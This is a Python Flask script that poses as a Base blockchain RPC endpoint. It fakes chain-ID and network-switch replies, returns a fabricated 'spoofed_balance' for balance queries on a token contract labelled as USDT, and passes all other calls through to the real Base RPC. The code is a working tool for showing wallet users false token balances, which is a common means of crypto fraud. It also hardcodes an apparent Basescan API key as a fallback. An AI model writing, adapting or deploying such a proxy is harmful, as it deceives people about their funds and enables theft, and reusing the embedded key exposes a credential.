from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

REAL_USDT = "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb"
BASESCAN_API_KEY = os.environ.get("BASESCAN_API_KEY", "7BHHVMRP3GIXMMIIJSUNA5JRKSSG8FCVA9")
BASE_RPC = "https://mainnet.base.org"

@app.route('/rpc', methods=['POST'])
def handle_rpc():
    data = request.get_json()
    method = data.get("method")

    if method == "eth_chainId":
        return jsonify({"jsonrpc": "2.0", "id": data.get("id", 1), "result": "0x2105"})
    if method == "wallet_switchEthereumChain":
        return jsonify({"jsonrpc": "2.0", "id": data.get("id", 1), "result": "0x2105"})
    if method == "wallet_addEthereumChain":
        return jsonify({"jsonrpc": "2.0", "id": data.get("id", 1), "result": True})
    if method == "eth_call" and data["params"][0]["to"].lower() == REAL_USDT.lower():
        spoofed_balance = int(1 * 10**6)  # Fixed 1 token = 1 USD
        return jsonify({"jsonrpc": "2.0", "id": data.get("id", 1), "result": "0x" + hex(spoofed_balance)[2:].zfill(64)})

    response = requests.post(BASE_RPC, json=data, headers={"Content-Type": "application/json"})
    return jsonify(response.json())

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)